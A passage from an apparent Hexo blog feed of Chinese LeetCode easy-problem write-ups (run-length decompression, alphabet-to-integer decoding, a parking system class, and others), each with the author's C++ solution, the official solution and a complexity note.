class="number">0</span>)&#123;</span><br><span class="line">                    <span class="comment">//最后一位数了,满足自除数条件</span></span><br><span class="line">                    result.push_back(i);</span><br><span class="line">                &#125;</span><br><span class="line">                tmp/=<span class="number">10</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/self-dividing-numbers/solution/zi-chu-shu-by-leetcode/">官方题解</a>:</h6><p><strong>方法一：暴力法</strong></p>
<p><strong>算法：</strong></p>
<p>对于给定范围内的每个数，我们将直接判断该数是否为自除数。<br>根据定义，我们先判断数字是否非零，若数字非零再判断是否能够被该数除尽。例如，对于 128，我们要判断 <code>d != 0 &amp;&amp; 128 % d == 0</code>，且 <code>d = 1, 2, 8</code>。<br>解决这个问题的一个简单方法是将数字转换成一个字符数组（python 中的字符串），然后在检查 <code>n%d==0</code> 时转换回整数执行模运算。<br>我们还可以不断地把数字除以 <code>10</code>，取整数的最后一个数字。在代码中为注释的部分。</p>
<p><strong>Java代码：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">selfDividingNumbers</span><span class="params">(<span class="keyword">int</span> left, <span class="keyword">int</span> right)</span> </span>&#123;</span><br><span class="line">        List&lt;Integer&gt; ans = <span class="keyword">new</span> ArrayList();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> n = left; n &lt;= right; ++n) &#123;</span><br><span class="line">            <span class="keyword">if</span> (selfDividing(n)) ans.add(n);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">selfDividing</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">char</span> c: String.valueOf(n).toCharArray()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="string">&#x27;0&#x27;</span> || (n % (c - <span class="string">&#x27;0&#x27;</span>) &gt; <span class="number">0</span>))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Alternate implementation of selfDividing:</span></span><br><span class="line"><span class="comment">    public boolean selfDividing(int n) &#123;</span></span><br><span class="line"><span class="comment">        int x = n;</span></span><br><span class="line"><span class="comment">        while (x &gt; 0) &#123;</span></span><br><span class="line"><span class="comment">            int d = x % 10;</span></span><br><span class="line"><span class="comment">            x /= 10;</span></span><br><span class="line"><span class="comment">            if (d == 0 || (n % d) &gt; 0) return false;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        return true;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(D)$。$D$是在区间 $[L, R]$ 里的整数数。</li>
<li>空间复杂度：$O(D)$，使用了一个数组来存放结果。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>思路基本一样，题解给出了Python和Java两个版本的代码，没啥可分析的。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>解压缩编码列表</title>
    <url>/2020/11/09/%E8%A7%A3%E5%8E%8B%E7%BC%A9%E7%BC%96%E7%A0%81%E5%88%97%E8%A1%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/decompress-run-length-encoded-list/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个以行程长度编码压缩的整数列表 <code>nums</code> 。</p>
<p>考虑每对相邻的两个元素 <code>[freq, val] = [nums[2*i], nums[2*i+1]]</code> （其中 <code>i &gt;= 0</code> ），每一对都表示解压后子列表中有 <code>freq</code> 个值为 <code>val</code> 的元素，你需要从左到右连接所有子列表以生成解压后的列表。</p>
<p>请你返回解压后的列表。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [1,2,3,4]</span><br><span class="line">输出：[2,4,4,4]</span><br><span class="line">解释：第一对 [1,2] 代表着 2 的出现频次为 1，所以生成数组 [2]。</span><br><span class="line">第二对 [3,4] 代表着 4 的出现频次为 3，所以生成数组 [4,4,4]。</span><br><span class="line">最后将它们串联到一起 [2] + [4,4,4] &#x3D; [2,4,4,4]。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [1,1,2,3]</span><br><span class="line">输出：[1,3,3]</span><br></pre></td></tr></table></figure>
<p><strong>限制：</strong></p>
<ul>
<li><code>2 &lt;= nums.length &lt;= 100</code></li>
<li><code>nums.length % 2 == 0</code></li>
<li><code>1 &lt;= nums[i] &lt;= 100</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>遍历整数列表nums，对每对相邻元素，循环生成freq个值为val的元素。</p>
<p><strong>c++代码：</strong>(执行用时8ms，击败80.33%，内存消耗10.4M，击败5.58%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">decompressRLElist</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; result;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.size()/<span class="number">2</span>;++i)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;nums[<span class="number">2</span>*i];++j)&#123;</span><br><span class="line">                result.push_back(nums[<span class="number">2</span>*i+<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/subtract-the-product-and-sum-of-digits-of-an-integer/solution/zheng-shu-de-ge-wei-ji-he-zhi-chai-by-leetcode-sol/">官方题解</a>:</h6><p><strong>方法一：模拟</strong></p>
<p>我们以步长（step）为 <code>2</code> 遍历数组 <code>nums</code>，对于当前遍历到的元素 <code>a</code> 和 <code>b</code>，我们将 <code>a</code> 个 <code>b</code> 添加进答案中即可。</p>
<p><strong>c++代码：</strong>（执行8ms，击败80.33%，内存10.4M，击败5.12%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">decompressRLElist</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; ans;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.size(); i += <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; nums[i]; ++j) &#123;</span><br><span class="line">                ans.push_back(nums[i + <span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(N+∑nums_{even})$，其中 $N$ 是数组 <code>nums</code> 的长度，$∑nums_{even}$  是数组 <code>nums</code> 中所有下标为偶数的元素之和。</li>
<li>空间复杂度：$O(∑nums_{even} )$。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>和官方题解思路相同，只是官方题解是设置步长为2，我是设置循环次数减半。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>解码字母到整数映射</title>
    <url>/2020/11/14/%E8%A7%A3%E7%A0%81%E5%AD%97%E6%AF%8D%E5%88%B0%E6%95%B4%E6%95%B0%E6%98%A0%E5%B0%84/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/decrypt-string-from-alphabet-to-integer-mapping/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个字符串 <code>s</code>，它由数字（<code>&#39;0&#39;</code> - <code>&#39;9&#39;</code>）和 <code>&#39;#&#39;</code> 组成。我们希望按下述规则将 <code>s</code> 映射为一些小写英文字符：</p>
<p>字符（<code>&#39;a&#39;</code> - <code>&#39;i&#39;</code>）分别用（<code>&#39;1&#39;</code> - <code>&#39;9&#39;</code>）表示。<br>字符（<code>&#39;j&#39;</code> - <code>&#39;z&#39;</code>）分别用（<code>&#39;10#&#39;</code> - <code>&#39;26#&#39;</code>）表示。<br>返回映射之后形成的新字符串。</p>
<p>题目数据保证映射始终唯一。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;10#11#12&quot;</span><br><span class="line">输出：&quot;jkab&quot;</span><br><span class="line">解释：&quot;j&quot; -&gt; &quot;10#&quot; , &quot;k&quot; -&gt; &quot;11#&quot; , &quot;a&quot; -&gt; &quot;1&quot; , &quot;b&quot; -&gt; &quot;2&quot;.</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;1326#&quot;</span><br><span class="line">输出：&quot;acz&quot;</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;25#&quot;</span><br><span class="line">输出：&quot;y&quot;</span><br></pre></td></tr></table></figure>
<p><strong>示例4：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;12345678910#11#12#13#14#15#16#17#18#19#20#21#22#23#24#25#26#&quot;</span><br><span class="line">输出：&quot;abcdefghijklmnopqrstuvwxyz&quot;</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= s.length &lt;= 1000</code></li>
<li><code>s[i]</code> 只包含数字（<code>&#39;0&#39;</code>-<code>&#39;9&#39;</code>）和 <code>&#39;#&#39;</code> 字符。</li>
<li><code>s</code> 是映射始终存在的有效字符串。</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>使用map容器存储键值对映射，遍历字符串，判断每个字符后面的第2个字符是否是’#’，如果是则长度为3的子串作为键，否则就是当前字符作为键去map中找值。</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗6.7M，击败18.21%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">freqAlphabets</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">string</span> result=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="built_in">map</span>&lt;<span class="built_in">string</span>,<span class="built_in">string</span>&gt; m;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">int</span> n=s.length();</span><br><span class="line">        <span class="built_in">string</span> arr1[<span class="number">26</span>]=&#123;<span class="string">&quot;1&quot;</span>,<span class="string">&quot;2&quot;</span>,<span class="string">&quot;3&quot;</span>,<span class="string">&quot;4&quot;</span>,<span class="string">&quot;5&quot;</span>,<span class="string">&quot;6&quot;</span>,<span class="string">&quot;7&quot;</span>,<span class="string">&quot;8&quot;</span>,<span class="string">&quot;9&quot;</span>,<span class="string">&quot;10#&quot;</span>,<span class="string">&quot;11#&quot;</span>,<span class="string">&quot;12#&quot;</span>,<span class="string">&quot;13#&quot;</span>,<span class="string">&quot;14#&quot;</span>,<span class="string">&quot;15#&quot;</span>,<span class="string">&quot;16#&quot;</span>,<span class="string">&quot;17#&quot;</span>,<span class="string">&quot;18#&quot;</span>,<span class="string">&quot;19#&quot;</span>,<span class="string">&quot;20#&quot;</span>,<span class="string">&quot;21#&quot;</span>,<span class="string">&quot;22#&quot;</span>,<span class="string">&quot;23#&quot;</span>,<span class="string">&quot;24#&quot;</span>,<span class="string">&quot;25#&quot;</span>,<span class="string">&quot;26#&quot;</span>&#125;;</span><br><span class="line">        <span class="built_in">string</span> arr2[<span class="number">26</span>]=&#123;<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>,<span class="string">&quot;d&quot;</span>,<span class="string">&quot;e&quot;</span>,<span class="string">&quot;f&quot;</span>,<span class="string">&quot;g&quot;</span>,<span class="string">&quot;h&quot;</span>,<span class="string">&quot;i&quot;</span>,<span class="string">&quot;j&quot;</span>,<span class="string">&quot;k&quot;</span>,<span class="string">&quot;l&quot;</span>,<span class="string">&quot;m&quot;</span>,<span class="string">&quot;n&quot;</span>,<span class="string">&quot;o&quot;</span>,<span class="string">&quot;p&quot;</span>,<span class="string">&quot;q&quot;</span>,<span class="string">&quot;r&quot;</span>,<span class="string">&quot;s&quot;</span>,<span class="string">&quot;t&quot;</span>,<span class="string">&quot;u&quot;</span>,<span class="string">&quot;v&quot;</span>,<span class="string">&quot;w&quot;</span>,<span class="string">&quot;x&quot;</span>,<span class="string">&quot;y&quot;</span>,<span class="string">&quot;z&quot;</span>&#125;;</span><br><span class="line">        <span class="comment">//初始化映射规则</span></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">26</span>;++i)&#123;</span><br><span class="line">            m[arr1[i]]=arr2[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//遍历字符串s</span></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;++i)&#123;</span><br><span class="line">            <span class="comment">//该字符后面第二个字符是#，表示对应字符j-z</span></span><br><span class="line">            <span class="keyword">if</span>(i&lt;n<span class="number">-2</span> &amp;&amp; s[i+<span class="number">2</span>]==<span class="string">&#x27;#&#x27;</span>)&#123;</span><br><span class="line">                <span class="comment">//截取长度为3的子串</span></span><br><span class="line">                result+=m[s.substr(i,<span class="number">3</span>)];</span><br><span class="line">                i+=<span class="number">2</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                result+=m[s.substr(i,<span class="number">1</span>)];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/decrypt-string-from-alphabet-to-integer-mapping/solution/jie-ma-zi-mu-dao-zheng-shu-ying-she-by-leetcode-so/">官方题解</a>:</h6><p><strong>方法一：遍历</strong></p>
<p>我们对字符串 <code>s</code> 进行顺序遍历。</p>
<p>当遍历到位置 <code>i</code> 时，我们首先向后看两个字符（即 <code>s[i + 2]</code>），如果 <code>s[i + 2]</code> 存在且为 <code>&#39;#&#39;</code>，那么位置 <code>i</code>，<code>i + 1</code> 和 <code>i + 2</code> 表示一个 <code>&#39;j&#39;</code> 到 <code>&#39;z&#39;</code> 之间的字符，否则位置 <code>i</code> 表示一个 <code>&#39;a&#39;</code> 到 <code>&#39;i&#39;</code> 的字符。</p>
<p>根据对 <code>s[i + 2]</code> 的判断，我们可以使用字符串转整数的方法得到对应的字符的 ASCII 码，从而得到字符本身。在这之后，我们将位置 <code>i</code> 后移，继续进行遍历直到结束。</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗6.4M，击败31.87%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">freqAlphabets</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">string</span> ans;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.size(); ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i + <span class="number">2</span> &lt; s.size() &amp;&amp; s[i + <span class="number">2</span>] == <span class="string">&#x27;#&#x27;</span>) &#123;</span><br><span class="line">                ans += <span class="keyword">char</span>((s[i] - <span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + (s[i + <span class="number">1</span>] - <span class="string">&#x27;1&#x27;</span>) + <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">                i += <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                ans += <span class="keyword">char</span>(s[i] - <span class="string">&#x27;1&#x27;</span> + <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(N)$，其中 $N$ 是字符串 <code>s</code> 的长度。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>思路是一样的，利用字符和ASCII之间的转换也挺好，代码比较简洁明了。我用了map容器反而增加了空间复杂度，代码看着比较长😯</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>设计停车系统</title>
    <url>/2020/11/07/%E8%AE%BE%E8%AE%A1%E5%81%9C%E8%BD%A6%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><a href="https://leetcode-cn.com/problems/design-parking-system/"><strong>题目地址</strong></a></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>请你给一个停车场设计一个停车系统。停车场总共有三种不同大小的车位：大，中和小，每种尺寸分别有固定数目的车位。</p>
<p>请你实现 <code>ParkingSystem</code> 类：</p>
<p><code>ParkingSystem(int big, int medium, int small)</code> 初始化 <code>ParkingSystem</code> 类，三个参数分别对应每种停车位的数目。<br><code>bool addCar(int carType)</code> 检查是否有 <code>carType</code> 对应的停车位。 <code>carType</code> 有三种类型：大，中，小，分别用数字 <code>1</code>， <code>2</code> 和 <code>3</code> 表示。<strong>一辆车只能停在</strong>  <code>carType</code> 对应尺寸的停车位中。如果没有空车位，请返回 <code>false</code> ，否则将该车停入车位并返回 <code>true</code> 。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：</span><br><span class="line">[&quot;ParkingSystem&quot;, &quot;addCar&quot;, &quot;addCar&quot;, &quot;addCar&quot;, &quot;addCar&quot;]</span><br><span class="line">[[1, 1, 0], [1], [2], [3], [1]]</span><br><span class="line">输出：</span><br><span class="line">[null, true, true, false, false]</span><br><span class="line"></span><br><span class="line">解释：</span><br><span class="line">ParkingSystem parkingSystem &#x3D; new ParkingSystem(1, 1, 0);</span><br><span class="line">parkingSystem.addCar(1); &#x2F;&#x2F; 返回 true ，因为有 1 个空的大车位</span><br><span class="line">parkingSystem.addCar(2); &#x2F;&#x2F; 返回 true ，因为有 1 个空的中车位</span><br><span class="line">parkingSystem.addCar(3); &#x2F;&#x2F; 返回 false ，因为没有空的小车位</span><br><span class="line">parkingSystem.addCar(1); &#x2F;&#x2F; 返回 false ，因为没有空的大车位，唯一一个大车位已经被占据了</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>0 &lt;= big, medium, small &lt;= 1000</code></li>
<li><code>carType</code> 取值为 <code>1</code>， <code>2</code> 或 <code>3</code></li>
<li>最多会调用 <code>addCar</code> 函数 <code>1000</code> 次</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>根据车类型判断是否有对应停车位，如果有则返回true且对应停车位数量减一，否则返回false。</p>
<p><strong>c++代码：</strong>(执行用时116ms，击败89.26%，内存消耗32.8M，击败6.39%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ParkingSystem</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> big,medium,small;</span><br><span class="line">    ParkingSystem(<span class="keyword">int</span> big, <span class="keyword">int</span> medium, <span class="keyword">int</span> small) &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;big=big;</span><br><span class="line">        <span class="keyword">this</span>-&gt;medium=medium;</span><br><span class="line">        <span class="keyword">this</span>-&gt;small=small;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">addCar</span><span class="params">(<span class="keyword">int</span> carType)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(carType==<span class="number">1</span> &amp;&amp; big&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            --big;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(carType==<span class="number">2</span> &amp;&amp; medium&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            --medium;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(carType==<span class="number">3</span> &amp;&amp; small&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            --small;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your ParkingSystem object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * ParkingSystem* obj = new ParkingSystem(big, medium, small);</span></span><br><span class="line"><span class="comment"> * bool param_1 = obj-&gt;addCar(carType);</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，简单题，也没啥总结的，Let‘s go on!。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>访问所有点的最小时间</title>
    <url>/2020/11/09/%E8%AE%BF%E9%97%AE%E6%89%80%E6%9C%89%E7%82%B9%E7%9A%84%E6%9C%80%E5%B0%8F%E6%97%B6%E9%97%B4/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><a href="https://leetcode-cn.com/problems/minimum-time-visiting-all-points/"><strong>题目地址</strong></a></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>平面上有 <code>n</code> 个点，点的位置用整数坐标表示 <code>points[i] = [xi, yi]</code>。请你计算访问所有这些点需要的最小时间（以秒为单位）。</p>
<p>你可以按照下面的规则在平面上移动：</p>
<ul>
<li>每一秒沿水平或者竖直方向移动一个单位长度，或者跨过对角线（可以看作在一秒内向水平和竖直方向各移动一个单位长度）。</li>
<li>必须按照数组中出现的顺序来访问这些点</li>
</ul>
<a id="more"></a>
<p><strong>示例1：</strong></p>
